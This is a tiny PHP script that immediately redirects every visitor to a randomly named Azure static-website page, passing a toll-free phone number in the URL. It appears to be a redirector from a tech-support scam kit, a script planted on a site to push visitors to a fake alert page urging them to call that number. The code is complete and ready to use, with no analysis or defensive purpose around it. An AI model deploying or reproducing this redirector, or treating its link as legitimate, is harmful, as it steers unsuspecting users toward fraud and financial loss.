<?php
// Define the destination URL
$destination_url = "https://hello98ween8hcoe.z23.web.core.windows.net/index.html?Aniph=1-855-458-7201";

// Send the Location header for redirection
header("Location: " . $destination_url);

// It's crucial to stop script execution after sending the header
// to prevent any further output or unintended actions.
exit(); 
?>